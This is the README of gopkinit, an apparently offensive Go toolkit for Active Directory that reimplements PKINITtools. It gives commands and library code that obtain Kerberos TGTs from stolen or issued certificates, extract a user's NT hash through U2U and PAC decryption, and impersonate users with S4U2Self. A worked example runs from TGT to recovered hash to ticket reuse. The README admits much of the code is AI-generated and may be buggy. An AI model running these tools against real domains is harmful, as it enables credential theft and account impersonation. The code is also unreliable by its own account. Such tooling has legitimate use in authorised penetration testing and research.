<div align="center">
  <img src="pkinitbro.png" alt="PKINIT Library" width="400"/>
</div>

# gopkinit

## Experimental Go PKINIT and Kerberos offensive tooling

The code in this repo functions, but much of it was AI generated. Please review and verify before using in production. This was implemented as a learning excercise and may contain bugs or security issues.

A complete Go implementation of PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) and related attack tools for Active Directory security testing.

## Status: All tools working

- **gettgtpkinit** - Obtain TGT using X.509 certificate authentication
- **getnthash** - Extract NT hash from PKINIT TGT using U2U authentication
- **gets4uticket** - Perform S4U2Self impersonation to obtain service tickets

## Overview

This project implements RFC 4556 (PKINIT) in Go along with U2U and S4U2Self functionality, providing a toolset for certificate-based Kerberos attacks.

## Documentation

For detailed protocol explanations and implementation deep dives, see the [docs](docs/) directory:

- [gettgtpkinit Deep Dive](docs/gettgtpkinit.md) - PKINIT internals, DH key exchange, troubleshooting
- [getnthash Deep Dive](docs/getnthash.md) - U2U authentication, PAC parsing, NT hash extraction
- [gets4uticket Deep Dive](docs/gets4uticket.md) - S4U2Self protocol, PA-FOR-USER, checksums

## Installation

```bash
# Clone and build all tools
git clone <repo>
cd gopkinit
go build -o gettgtpkinit ./cmd/gettgtpkinit
go build -o getnthash ./cmd/getnthash
go build -o gets4uticket ./cmd/gets4uticket

# Or install directly
go install github.com/ineffectivecoder/gopkinit/cmd/gettgtpkinit@latest
go install github.com/ineffectivecoder/gopkinit/cmd/getnthash@latest
go install github.com/ineffectivecoder/gopkinit/cmd/gets4uticket@latest
```

## Tools

### gettgtpkinit - Certificate-Based TGT Request

Request a TGT using X.509 certificate authentication (PKINIT).

**⚠️ CRITICAL REQUIREMENT:** Ensure your system clock is synchronized with the domain controller. Kerberos requires clock skew to be within ±5 minutes. On Linux, run `sudo ntpdate <dc-ip>` before executing the tool.

```bash
# Sync time first (REQUIRED)
sudo ntpdate 10.0.0.1

# Basic usage
./gettgtpkinit -cert-pfx user.pfx DOMAIN.COM/user output.ccache

# With password-protected PFX
./gettgtpkinit -cert-pfx user.pfx -pfx-pass password DOMAIN.COM/user output.ccache

# Specify DC IP address
./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache

# Through SOCKS5 proxy
./gettgtpkinit -cert-pfx user.pfx -proxy 127.0.0.1:1080 -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache

# Verbose output
./gettgtpkinit -cert-pfx user.pfx -v DOMAIN.COM/user output.ccache
```

**Output**: Saves TGT to ccache file and prints the AS-REP encryption key (needed for `getnthash`).

### getnthash - NT Hash Extraction via U2U

Extract NT hash from a PKINIT-obtained TGT using User-to-User (U2U) authentication. This works because PKINIT TGTs contain an encrypted PAC_CREDENTIAL_INFO buffer with the user's NT hash.

```bash
./getnthash -ccache user.ccache -key <asrep-key-from-gettgtpkinit> -dc-ip 10.0.0.1
```

**Options**:

- `-ccache` - Path to ccache file containing PKINIT TGT
- `-key` - AS-REP encryption key from gettgtpkinit (hex string)
- `-dc-ip` - IP address of domain controller
- `-v` - Verbose output

**Output**: Prints the recovered NT hash.

### gets4uticket - S4U2Self Impersonation

Obtain a service ticket impersonating another user using S4U2Self. Requires an account with delegation privileges.

```bash
./gets4uticket -ccache admin.ccache -impersonate user@DOMAIN.COM \
  -spn cifs/fileserver.domain.com@DOMAIN.COM -dc-ip 10.0.0.1 -out user_cifs.ccache
```

**Options**:

- `-ccache` - Path to ccache file containing TGT
- `-impersonate` - User to impersonate (format: user@REALM)
- `-spn` - Service principal name (format: service/host@REALM)
- `-dc-ip` - IP address of domain controller
- `-out` - Output ccache file path
- `-v` - Verbose output

**Output**: Saves impersonated service ticket to ccache file.

## Example Workflow

```bash
# Step 1: Get TGT with certificate
$ ./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache
AS-REP encryption key (you might need this later):
c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890
Saved TGT to file

# Step 2: Extract NT hash from the PKINIT TGT
$ ./getnthash -ccache output.ccache -key c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890 -dc-ip 10.0.0.1
Recovered NT Hash: e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6

# Step 3: Use TGT with other tools
$ export KRB5CCNAME=output.ccache
$ smbclient.py -k target.domain.com
```

## Library Usage

The gopkinit packages can be used as a library in your own Go projects. Each package provides clean APIs for specific Kerberos functionality.

### Installing the Library

```bash
go get github.com/ineffectivecoder/gopkinit
```

### Package Overview

| Package | Description |
|---------|-------------|
| `pkg/pkinit` | PKINIT client for certificate-based TGT requests |
| `pkg/s4u` | S4U2Self client for user impersonation |
| `pkg/u2u` | User-to-User client for NT hash extraction |
| `pkg/ccache` | MIT Kerberos ccache file read/write |
| `pkg/krb` | Low-level KDC communication and TGS handling |
| `pkg/pac` | PAC (Privilege Attribute Certificate) parsing |
| `pkg/cert` | PFX/PKCS12 certificate loading |

---

### pkinit - Certificate-Based Authentication

The `pkinit` package implements RFC 4556 PKINIT for obtaining TGTs using X.509 certificates.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/pkinit"

// Create client from PFX file
client, err := pkinit.NewFromPFX("user.pfx", "password")
if err != nil {
    log.Fatal(err)
}

// Or create client from PFX bytes (useful for embedded certs)
pfxData, _ := os.ReadFile("user.pfx")
client, err := pkinit.NewFromPFXData(pfxData, "password")

// Request TGT from KDC
// Parameters: domain, username, kdcAddress, proxyAddress (empty for no proxy)
result, err := client.GetTGT("DOMAIN.COM", "username", "dc.domain.com", "")
if err != nil {
    log.Fatal(err)
}

// Access results
fmt.Printf("AS-REP Key: %s\n", result.ASRepKey)        // Hex string, needed for getnthash
fmt.Printf("Session Key Type: %d\n", result.SessionKey.KeyType)
fmt.Printf("Ticket Realm: %s\n", result.Realm)

// Access the certificate info
cert := client.GetCertificate()
fmt.Printf("Certificate Subject: %s\n", cert.Subject.CommonName)
fmt.Printf("Issuer: %s\n", client.GetIssuer())
```

**TGTResult Fields**:

- `Ticket` - The Kerberos ticket (gokrb5 messages.Ticket)
- `EncPart` - Decrypted AS-REP encrypted part
- `SessionKey` - TGT session key for subsequent requests
- `ASRepKey` - Hex-encoded key for PAC credential decryption (used by getnthash)
- `Realm` - Client realm
- `CName` - Client principal name

---

### s4u - S4U2Self Impersonation

The `s4u` package implements S4U2Self (Service-for-User-to-Self) for obtaining service tickets on behalf of other users.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/s4u"

// Create client from ccache file containing a TGT
client, err := s4u.NewS4U2SelfClient("admin.ccache", "dc.domain.com")
if err != nil {
    log.Fatal(err)
}

// Request impersonated service ticket
// Parameters: targetUser, targetRealm, serviceName, serviceRealm, outputPath
err = client.GetS4U2SelfTicket(
    "targetuser",           // User to impersonate
    "DOMAIN.COM",           // Target user's realm
    "cifs/fileserver",      // Service principal name
    "DOMAIN.COM",           // Service realm
    "impersonated.ccache",  // Output file
)
if err != nil {
    // Error 16 (KDC_ERR_PADATA_TYPE_NOSUPP) indicates delegation not enabled
    log.Fatal(err)
}

fmt.Println("Impersonated ticket saved to impersonated.ccache")
```

**Requirements**:

- The account whose TGT is in the ccache must have delegation privileges
- The target user must be delegatable (not marked as "sensitive")

---

### u2u - NT Hash Extraction

The `u2u` package implements User-to-User authentication to extract NT hashes from PKINIT TGTs.

```go
import (
    "encoding/hex"
    "github.com/ineffectivecoder/gopkinit/pkg/u2u"
)

// Decode AS-REP key from gettgtpkinit output
asrepKey, _ := hex.DecodeString("c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890")

// Create U2U client
client, err := u2u.NewU2UClient("user.ccache", "dc.domain.com", asrepKey)
if err != nil {
    log.Fatal(err)
}

// Extract NT hash
ntHash, err := client.GetNTHash()
if err != nil {
    // Common errors:
    // - "PAC_CREDENTIAL_INFO not found" = TGT not from PKINIT
    // - "failed to decrypt PAC credentials" = wrong AS-REP key
    log.Fatal(err)
}

fmt.Printf("NT Hash: %x\n", ntHash)
```

**How it works**:

1. Sends U2U TGS-REQ to request a ticket encrypted with our own TGT session key
2. Decrypts the returned ticket to access the PAC
3. Finds PAC_CREDENTIAL_INFO buffer (only present in PKINIT TGTs)
4. Decrypts credentials using the AS-REP key
5. Parses NDR-encoded NTLM_SUPPLEMENTAL_CREDENTIAL to extract NT hash

---

### ccache - Credential Cache I/O

The `ccache` package provides MIT Kerberos ccache v4 format reading and writing.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/ccache"

// Write a ccache file
err := ccache.WriteCCache(
    "output.ccache",
    ticket,          // messages.Ticket
    encPart,         // messages.EncKDCRepPart
    sessionKey,      // types.EncryptionKey
    "DOMAIN.COM",    // realm
    principalName,   // types.PrincipalName
)

// Read a ccache file
cc, err := ccache.ReadCCache("input.ccache")
if err != nil {
    log.Fatal(err)
}

// Access default principal
fmt.Printf("Principal: %s@%s\n",
    strings.Join(cc.DefaultPrincipal.Components, "/"),
    cc.DefaultPrincipal.Realm)

// Get TGT from ccache
tgt, err := cc.GetTGT()
if err != nil {
    log.Fatal("No TGT in ccache")
}

// Access TGT details
fmt.Printf("TGT expires: %s\n", tgt.EndTime)
fmt.Printf("Session key type: %d\n", tgt.Key.KeyType)

// Convert to gokrb5 Ticket for use with other operations
ticket, err := tgt.ToTicket()

// Convert principal for use with gokrb5
principalName := tgt.Client.ToPrincipalName()
```

**CCache struct**:

- `Version` - File format version (0x0504 for v4)
- `DefaultPrincipal` - Default principal in the cache
- `Credentials` - List of cached credentials

**Credential struct**:

- `Client`, `Server` - Principal structs
- `Key` - Session key (types.EncryptionKey)
- `AuthTime`, `StartTime`, `EndTime`, `RenewTill` - Time fields
- `Ticket` - Raw ticket bytes

---

### krb - KDC Communication

The `krb` package handles low-level communication with Kerberos Distribution Centers.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/krb"

// Create KDC client
client := krb.NewKDCClient("dc.domain.com")

// Optional: Configure SOCKS5 proxy
client.SetProxy("127.0.0.1:1080")

// Send AS-REQ and get AS-REP
asRepBytes, err := client.SendASReq(asReqBytes)
if err != nil {
    log.Fatal(err)
}

// Send TGS-REQ and get TGS-REP
tgsRepBytes, err := client.SendTGSReq(tgsReqBytes)

// Parse responses
asRep, err := krb.ParseASRep(asRepBytes)
tgsRep, err := krb.ParseTGSRep(tgsRepBytes)

// Decrypt TGS-REP encrypted part
encPart, err := krb.DecryptTGSRep(tgsRep, sessionKey)

// Build TGS-REQ for service tickets
tgsReq := &krb.TGSRequest{
    Realm:      "DOMAIN.COM",
    CName:      clientPrincipal,
    TGT:        tgtTicket,
    SessionKey: sessionKey,
    SName:      servicePrincipal,
    SRealm:     "DOMAIN.COM",
}
reqBytes, err := tgsReq.BuildTGSReq()
```

**Features**:

- Automatic UDP/TCP fallback (UDP for small requests, TCP for large)
- SOCKS5 proxy support
- 30-second default timeout
- Proper TCP framing (4-byte length prefix)

---

### pac - PAC Parsing

The `pac` package parses Windows Privilege Attribute Certificates.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/pac"

// Parse PAC from authorization data
pacStruct, err := pac.ParsePAC(pacData)
if err != nil {
    log.Fatal(err)
}

// Find specific buffer types
credBuf := pacStruct.FindBuffer(pac.PACTypeCredentials)         // Type 2
logonBuf := pacStruct.FindBuffer(pac.PACTypeKerbValidationInfo) // Type 1
clientBuf := pacStruct.FindBuffer(pac.PACTypeClientInfo)        // Type 10

// Parse PAC_CREDENTIAL_INFO (for PKINIT TGTs)
if credBuf != nil {
    credInfo, err := pac.ParseCredentialInfo(credBuf.Data)
    fmt.Printf("Encryption Type: %d\n", credInfo.EncryptionType)

    // Decrypt and parse credential data
    decrypted, _ := crypto.DecryptMessage(credInfo.SerializedData, key, 16)
    credData, err := pac.ParseCredentialData(decrypted)

    for _, cred := range credData.Credentials {
        fmt.Printf("NT Hash: %x\n", cred.NTPassword)
    }
}
```

**Buffer Types**:

- `PACTypeKerbValidationInfo` (1) - User logon information
- `PACTypeCredentials` (2) - Encrypted credentials (PKINIT only)
- `PACTypeServerChecksum` (6) - Server signature
- `PACTypePrivSvrChecksum` (7) - KDC signature
- `PACTypeClientInfo` (10) - Client name and auth time
- `PACTypeUPNDNSInfo` (12) - UPN and DNS info

---

### cert - Certificate Loading

The `cert` package handles PFX/PKCS12 certificate loading.

```go
import "github.com/ineffectivecoder/gopkinit/pkg/cert"

// Load from file
bundle, err := cert.LoadPFX("user.pfx", "password")
if err != nil {
    log.Fatal(err)
}

// Load from bytes
pfxData, _ := os.ReadFile("user.pfx")
bundle, err := cert.LoadPFXData(pfxData, "password")

// Access certificate bundle
fmt.Printf("Subject: %s\n", bundle.Certificate.Subject.CommonName)
fmt.Printf("Issuer: %s\n", bundle.Issuer)
fmt.Printf("Not After: %s\n", bundle.Certificate.NotAfter)

// Use private key for signing
signer := bundle.PrivateKey.(crypto.Signer)
```

---

## Complete Library Example

Here's a complete example combining multiple packages to get a TGT and extract the NT hash:

```go
package main

import (
    "encoding/hex"
    "fmt"
    "log"

    "github.com/ineffectivecoder/gopkinit/pkg/pkinit"
    "github.com/ineffectivecoder/gopkinit/pkg/u2u"
)

func main() {
    // Step 1: Get TGT using PKINIT
    client, err := pkinit.NewFromPFX("user.pfx", "password")
    if err != nil {
        log.Fatalf("Failed to load certificate: %v", err)
    }

    result, err := client.GetTGT("DOMAIN.COM", "user", "dc.domain.com", "")
    if err != nil {
        log.Fatalf("Failed to get TGT: %v", err)
    }
    fmt.Printf("Got TGT, AS-REP key: %s\n", result.ASRepKey)

    // Step 2: Save TGT to ccache (gettgtpkinit does this for you)
    // For library usage, you'd call ccache.WriteCCache here

    // Step 3: Extract NT hash using U2U
    // Note: In practice, you'd read from the ccache file
    asrepKey, _ := hex.DecodeString(result.ASRepKey)
    u2uClient, err := u2u.NewU2UClient("user.ccache", "dc.domain.com", asrepKey)
    if err != nil {
        log.Fatalf("Failed to create U2U client: %v", err)
    }

    ntHash, err := u2uClient.GetNTHash()
    if err != nil {
        log.Fatalf("Failed to get NT hash: %v", err)
    }

    fmt.Printf("Recovered NT Hash: %x\n", ntHash)
}
```

## Features

### gettgtpkinit

- PKINIT Authentication (RFC 4556)
- PFX/PKCS12 certificate loading
- Diffie-Hellman key exchange with static AD-compatible parameters
- Native CMS/PKCS7 signing
- MIT Kerberos ccache v4 output
- AS-REP key export for getnthash
- SOCKS5 proxy support

### getnthash

- User-to-User (U2U) TGS request
- PAC parsing with PAC_CREDENTIAL_INFO extraction
- AES256 decryption of encrypted credentials
- NDR structure parsing for NTLM_SUPPLEMENTAL_CREDENTIAL

### gets4uticket

- S4U2Self (Service-for-User-to-Self) implementation
- RFC 4757 HMAC-MD5 checksum for PA-FOR-USER
- Delegation-based impersonation
- Service ticket output to ccache

## Project Structure

```
gopkinit/
├── cmd/
│   ├── gettgtpkinit/     # TGT retrieval CLI
│   ├── getnthash/        # NT hash extraction CLI
│   └── gets4uticket/     # S4U2Self CLI
├── pkg/
│   ├── cert/             # Certificate loading (PFX/PKCS12)
│   ├── pkinit/           # PKINIT implementation
│   │   ├── pkinit.go     # Main client, GetTGT()
│   │   ├── dh.go         # Diffie-Hellman key exchange
│   │   ├── authpack.go   # RFC 4556 ASN.1 structures
│   │   ├── cms.go        # CMS/PKCS7 signing
│   │   ├── asreq.go      # AS-REQ builder
│   │   └── asrep.go      # AS-REP decryption
│   ├── krb/              # Kerberos network client
│   │   ├── client.go     # KDC communication (TCP/UDP/SOCKS5)
│   │   └── tgs.go        # TGS-REQ/TGS-REP handling
│   ├── ccache/           # MIT ccache file I/O
│   │   ├── ccache.go     # Writer (WriteCCache)
│   │   └── reader.go     # Reader (ReadCCache, ParseCCache)
│   ├── s4u/              # S4U2Self implementation
│   │   └── s4u.go        # S4U2SelfClient
│   ├── u2u/              # User-to-User implementation
│   │   └── u2u.go        # U2UClient, GetNTHash()
│   └── pac/              # PAC parsing
│       └── pac.go        # ParsePAC, ParseCredentialInfo
```

## Technical Implementation Details

### PKINIT (gettgtpkinit)

The PKINIT implementation handles several complex requirements:

1. **Static Diffie-Hellman Parameters**: Active Directory requires specific 1024-bit DH parameters (not dynamically generated)

2. **ASN.1 Tagging Complexity**: Kerberos uses a mix of implicit and explicit ASN.1 tags requiring careful handling

3. **DH Shared Secret Padding**: `big.Int.Bytes()` strips leading zeros, so shared secrets must be zero-padded to modulus size (128 bytes)

4. **ServerDHNonce Extraction**: The 32-byte nonce in PA_PK_AS_REP uses explicit tags requiring two-step parsing

### S4U2Self (gets4uticket)

The S4U2Self implementation includes:

1. **RFC 4757 HMAC-MD5 Checksum**: PA-FOR-USER requires the Kerberos HMAC-MD5 algorithm (not plain HMAC-MD5):
   - `ksign = HMAC-MD5(key, "signaturekey\x00")`
   - `md5hash = MD5(usage_str(keyusage) + data)`
   - `checksum = HMAC-MD5(ksign, md5hash)`

2. **Key Usage 17**: The S4U checksum uses key usage 17 per MS-SFU specification

### U2U/NT Hash Extraction (getnthash)

The U2U implementation extracts NT hashes from PKINIT TGTs:

1. **U2U TGS Request**: Request a ticket to ourselves with `enc_tkt_in_skey` flag set

2. **PAC Parsing**: Parse the PAC structure to find PAC_CREDENTIAL_INFO (type 2)

3. **Credential Decryption**: Decrypt the PAC_CREDENTIAL_INFO using the AS-REP key with key usage 16

4. **NDR Parsing**: Parse the NDR-encoded PAC_CREDENTIAL_DATA to extract NTLM_SUPPLEMENTAL_CREDENTIAL

## Dependencies

```go
require (
    github.com/jcmturner/gokrb5/v8           // Kerberos structures
    software.sslmate.com/src/go-pkcs12       // PKCS12 parsing
    golang.org/x/net/proxy                   // SOCKS5 support
    golang.org/x/crypto                      // Crypto primitives
)
```

## Known Limitations

- PEM certificate format not yet supported (use PFX)
- RC4 encryption not supported (AES256/AES128 only)
- No smart card/hardware token support
- S4U2Proxy not yet implemented

## References

- [RFC 4556 - PKINIT](https://datatracker.ietf.org/doc/html/rfc4556)
- [RFC 4757 - RC4-HMAC Kerberos Encryption](https://datatracker.ietf.org/doc/html/rfc4757)
- [MS-SFU - S4U Extensions](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
- [MS-PAC - PAC Data Structure](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) by @_dirkjan
- [minikerberos](https://github.com/skelsec/minikerberos) by @skelsec
- [gokrb5](https://github.com/jcmturner/gokrb5)

## License

Based on PKINITtools by Dirk-jan Mollema (@_dirkjan) and minikerberos by Tamas Jos (@skelsec).
